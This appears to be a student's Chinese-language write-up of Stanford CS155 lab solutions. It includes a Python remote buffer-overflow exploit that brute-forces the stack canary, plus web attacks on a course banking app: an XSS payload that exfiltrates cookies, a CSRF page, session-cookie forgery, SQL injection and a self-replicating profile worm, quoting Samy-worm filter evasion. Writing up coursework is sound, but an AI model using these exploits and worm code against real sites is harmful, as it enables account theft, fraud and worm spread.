**注意注意，buf里面不能有`\x0a`**，所以在从`0x0`到`0xf`的循环过程中，一定要跳过`\x0a`，不然的话就会停止拷贝。之前没有跳过`\x0a`卡了三个小时。。。（但是好像如果canary里头就有`\x0a`，好像buffer overflow就挂了，那咋办啊？？？

不管这么多，看到`/tmp`底下果然没有`passwd`，bingo！

**proj1终于写完啦！撒花！**
```console
user@vm-cs155:~/cs155/proj1/sploits$ echo "a" > /tmp/passwd; ./extra-credit.py 127.0.0.1 5555; ls /tmp/
extra-credit                                                                       target1  target3  target5
systemd-private-cb4299414fa940e5bdeb7372cd9880ab-systemd-timesyncd.service-TZOrP2  target2  target4  target6
```
```python
#!/usr/bin/python2
import sys
import socket
import traceback
import struct

####

## This function takes your exploit code, adds a carriage-return and newline
## and sends it to the server. The server will always respond, but if the
## exploit crashed the server it will close the connection. Therefore, we try
## to write another query to the server, recv on the socket and see if we get
## an exception
##
## True means the exploit made the server close the connection (i.e. it crashed)
## False means the socket is still operational.
def try_exploit(exploit, host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send("%s\n" % exploit)
    b = 0
    while b < (len(exploit) + 1):
        mylen = len(sock.recv(4098))
        b += mylen
        if mylen == 0:
            return True
    sock.send("\n")
    try:
        return len(sock.recv(5)) == 0
    except:
        return True

def exploit(host, port, shellcode):
    # Build your exploit here
    # One useful function might be
    #   struct.pack("<I", x)
    # which returns the 4-byte binary encoding of the 32-bit integer x
    BUFFER_SIZE = 2048
    sploitstring = "\x90" * BUFFER_SIZE
    sploitstring = sploitstring[:200] + shellcode + sploitstring[200+len(shellcode):]
    try_char_int = 0
    canary = ""
    count = 0
    while True:
        if count == 4:
            break
        for i in xrange(0, 256):
            if i == 10:
                continue
            try_char = struct.pack("<I", i)[:1]
            cur_exploit = sploitstring + canary + try_char
            if not try_exploit(cur_exploit, host, port):
                # Connection still up
                canary += try_char
                count += 1
                break
    final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
    try_exploit(final_exploit, host, port)

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    exploit(sys.argv[1], int(sys.argv[2]), shellcode)

except:
    print("Exception:")
    print(traceback.format_exc())

```

# Proj2
## Exploit Alpha Cookie Theft
题目的意思是，通过访问[http://localhost:3000/profile?username=...](http://localhost:3000/profile?username=...)来获得cookie然后发送给[http://localhost:3000/steal_cookie?cookie=...cookie](http://localhost:3000/steal_cookie?cookie=...cookie)

先来看一下express的代码，可以看到当api为`/profile?username=`时，会把`username`拿出来，然后去query db，然后调用render来显示网页，值得注意的是，当`username`不存在的时候，error message直接是`${req.query.username} does not exist!`，也就是把整个`req.query.username`都放到了html文件中，这里可以注入html+js代码
```javascript
router.get('/profile', asyncMiddleware(async (req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };

  if(req.query.username != null) { // if visitor makes a search query
    const db = await dbPromise;
    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
    let result;
    try {
      result = await db.get(query);
    } catch(err) {
      result = false;
    }
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
  } else { // visitor did not make query, show them their own profile
    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
  }
}));
```

这里要注意一下几点

- 如果用户不存在，会用蓝色显示**xx does not exist!**，因此需要加入`<p hidden>`来隐藏这行输出
- cookie中可能有其他的key value pair，但是题目只要拿到session，注意，**加号`+`在这里不work**
```javascript
function getCookie(name) {
  var value = "; ".concat(document.cookie);
  var parts = value.split("; ".concat(name).concat("="));
  if (parts.length == 2) 
    return parts.pop().split(";").shift();
}
var stolenCookie = getCookie("session");
```
- 要用异步方式来发送请求
```javascript
var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie=...'); 
xmlhttp.onload = function () {
  // This is reached after xmlhttp.send completes and server responds
};
xmlhttp.send(); // this method is asynchronous! 
```
- 可以重新定向到正常的url防止出现破绽
```javascript
window.location.replace("http://localhost:3000/profile?username=user1");
```
完整的url请求如下所示
```html
http://localhost:3000/profile?username=<p hidden><script>function getCookie(name) {var value = "; ".concat(document.cookie);var parts = value.split("; ".concat(name).concat("="));if (parts.length == 2) return parts.pop().split(";").shift();}var stolenCookie = getCookie("session");var xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolenCookie)); xmlhttp.onload = function () {};xmlhttp.send();window.location.replace("http://localhost:3000/profile?username=user1");</script>
```

## Exploit Bravo Cross Site Request Forgery
`app.js`文件中，修改了以下几处，使得CSRF有可乘之机

- Access-Control-Allow-Origin用来控制跨域访问，默认关闭
- httpOnly指只能通过http的方式来访问cookie，也就是说无法通过js来访问，比如`document.cookie`

```javascript
// adjust CORS policy (DO NOT CHANGE)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "null");
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});

// set lax cookie policies (DO NOT CHANGE)
app.use(cookieSession({
  name: 'session',
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  signed: false,
  sameSite: false,
  httpOnly: false,
}));
```
要注意的是，form的target指向一个空白iframe，因为正常情况下，form提交后会刷新页面，从而显示BitBar的内容，被别人发现233333，并且，只有当执行了`load`之后，才能执行`bye`中的跳转，因为在第一次load iframe的时候回执行，然后当form提交时候会再执行一次

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset='utf-8'>
        <script>
            var hit=false;
            function load(){
                document.getElementById('csrf').submit();
                hit=true;
            }
            function bye(){
                if(hit){
                    window.location.replace("http://crypto.stanford.edu/cs155");
                }
            }
        </script>
    </head>
    <body onload="load()">
        <form id="csrf" method="POST" target="iframe" action="http://localhost:3000/post_transfer">
            <input name="destination_username" type="hidden" value="attacker">
            <input name="quantity" type="hidden" value="10">
        </form>
        <iframe style="width:0; height:0; border:0; border:none" name="iframe" onload="bye()"></iframe>
    </body>
</html>
```

## Exploit Charlie Session Hijacking with Cookies
题目的意思是，Login的时候是attacker，但想要登陆user1的账号，并完成转账。先来看下cookie中的session是什么鬼，可以看到，session其实是一串base64的编码
```console
$ document.cookie
"session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjIwfX0="
```
用`atob()`解码看看
```json
"{\"loggedIn\":true,\"account\":{\"username\":\"attacker\",\"hashedPassword\":\"0fc921dccfcb071132e72385f10d91dcb213983792dfe93de8b5d3274b5a5cf5\",\"salt\":\"21834708492970860368940710131560218741\",\"profile\":\"\",\"bitbars\":0}}"
```
再看看服务器登陆的验证机制，发现只判断了`session.loggedIn`以及去db查询`username`是否在db里，所以可以直接更改`username`来劫持session
```javascript
router.get('/profile', asyncMiddleware(async (req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };

  if(req.query.username != null) { // if visitor makes a search query
    const db = await dbPromise;
    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
    let result;
    try {
      result = await db.get(query);
    } catch(err) {
      result = false;
    }
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
  } else { // visitor did not make query, show them their own profile
    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
  }
}));
```
进行以下更改即可实现session劫持并完成转账
```javascript
function getCookie(name) {
  var value = "; ".concat(document.cookie);
  var parts = value.split("; ".concat(name).concat("="));
  if (parts.length == 2) 
    return parts.pop().split(";").shift();
}
var cookie = getCookie("session");
var json = atob(cookie);
var jsonObj = JSON.parse(json);
jsonObj.account.username = "user1";
jsonObj.account.bitbars = 200
var user1Cookie = JSON.stringify(jsonObj);
document.cookie = "session=".concat(btoa(user1Cookie));
```
## Exploit Delta Cooking the Books with Cookies
attacker给user1转账1块，然后attacker账户有一个million，方法和C完全相同，由于`transfer`过程中，BitBar数量是从session中获得，所以只要transfer一块就能把任意的数量的BitBar在数据库中固定
```javascript
    req.session.account.bitbars -= amount;
    query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
    await db.exec(query);
```
具体js如下所示
```javascript
function getCookie(name) {
  var value = "; ".concat(document.cookie);
  var parts = value.split("; ".concat(name).concat("="));
  if (parts.length == 2) 
    return parts.pop().split(";").shift();
}
var cookie = getCookie("session");
var json = atob(cookie);
var jsonObj = JSON.parse(json);
jsonObj.account.bitbars = 1000000
var attackerCookie = JSON.stringify(jsonObj);
document.cookie = "session=".concat(btoa(attackerCookie));
```

## Exploit Echo SQL Injection
题目要求，创建一个新的用户，点击`close`时候删除`user3`，`close`的API接口如下，可以看到SQL命令把整个`username`都放进去了，所以可以注入SQL，只要使得`username=user3";`即可

`close` API最后log一下db，发现`user3`已经消失了
```javascript
router.get('/close', asyncMiddleware(async (req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };
  const db = await dbPromise;
  const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`;
  await db.get(query);
  req.session.loggedIn = false;
  req.session.account = {};
  render(req, res, next, 'index', 'Bitbar Home', 'Deleted account successfully!');
  logDatabaseState();
}));
```

## Exploit Foxtrot Profile Worm
题目要求，`attacker`在自己的profile上post自己的profile，其他用户如`user1`访问了`attacker`的profile时，会自动给`attacker`转账一块钱，然后复制这个worm，从而可以感染其他访问`user1`的无辜用户

- 可参考著名的**Samy Worm**蠕虫病毒，20小时感染一百万账户，牛逼的不行💯，以及他自己写的代码解析
- [Wikipedia: 萨米 (计算机蠕虫)](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))
- [MySpace Worm Explanation](https://samy.pl/myspace/tech.html)

首先，看下profile是怎样表示的，没有任何处理直接把`result.profile`贴进HTML，和之前方法一样直接注入HTML攻击
```html
    <% if (result.username && result.profile) { %>
        <div id="profile"><%- result.profile %></div>
    <% } %>
```
与之前`b.html`的方法完全类似

- **复制病毒**

`<body>`有个`onload`事件，会运行`load()`，这时候会把`textarea`的东西填满，然后提交表格，也就是把这个profile worm复制到自己的profile中。这里卡了好久，一开始想写一个函数，可以返回函数本体，然后陷入了无穷嵌套根本绕不出来😕去看下Samy大神是做self replicate的
>
5) In order to post the code to the user's profile who is viewing it, we need to actually get the source of the page. Ah, we can use document.body.innerHTML in order to get the page source which includes, in only one spot, the ID of the user viewing the page. Myspace gets me again and strips out the word "innerHTML" anywhere. To avoid this, we use an eval() to evaluate two strings and put them together to form "innerHTML". 
Example: alert(eval('document.body.inne' + 'rHTML'));
>

妈呀，好机智，直接用innerHTML不就好了嘛，最蠢的方法，最外面包一个`<div id='forge>...</div>`就可以拿出一整块HTML代码啦啦啦
```javascript
var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>");
```
但是发现，这样做其实是不够的，因为拿innerHTML时候，`<body>` tag就木有了，试了一下只有`<body onload>`的onload最好用，用个很傻的方法，在`<form></form>`外面包上两个hidden的`<p>` tag，然后替换他们时候加上`<body onload>`，具体如下
```javascript
var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>")
  .replace('<p hidden="">hello</p>', '<p hidden="">hello</p><body onload="load()">')
  .replace('<p hidden="">byebye</p>', '<p hidden="">byebye</p></body>');
```
这样就能保证每次都能复制worm病毒啦啦啦

- **提交form**

与之前的类似，提交form的逻辑是，首先调用`load()`，提交`<form id="worm" target="iframe1" ...>`并把刷新结果指向隐藏的`iframe1`，然后调用`transferMoney()`，提交`<form id="transfer" target="iframe2" ...>`并把刷新结果指向隐藏的`iframe2`

完整的profile worm代码如下所示，尽情地传播吧！我的蠕虫🐛！嘻嘻😆
```html
<div id="forge">
    Money money I want money
<script type="text/javascript">
    var loadDone = false;
    var transferDone = false;
    function load() {
        console.log("load");
        document.getElementById("new_textarea").value = textarea;
        document.getElementById("worm").submit();
        loadDone = true;
    }
    function transferMoney() {
        console.log("transfer load");
        if (loadDone) {
            console.log("transfer");
            document.getElementById("transfer").submit();
            transferDone = true;
        }
    }
    function bye() {
        if (transferDone) {
        }
    }
</script>
<body onload="load()">
    <p hidden="">hello</p>
    <form id="worm" method="POST" target="iframe1" action="http://localhost:3000/set_profile">
        <textarea id="new_textarea" name="new_profile" style="display:none;"></textarea>
    </form>
    <form id="transfer" method="POST" target="iframe2" action="http://localhost:3000/post_transfer">
        <input name="destination_username" type="hidden" value="attacker">
        <input name="quantity" type="hidden" value="1">
    </form>
    <iframe style="width:0; height:0; border:0; border:none" name="iframe1" onload="transferMoney()"></iframe>
    <iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="bye()"></iframe>
    <p hidden="">byebye</p>
</body>

<script type="text/javascript">
    var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>").replace('<p hidden="">hello</p>', '<p hidden="">hello</p><body onload="load()">').replace('<p hidden="">byebye</p>', '<p hidden="">byebye</p></body>');
</script>
</div>
```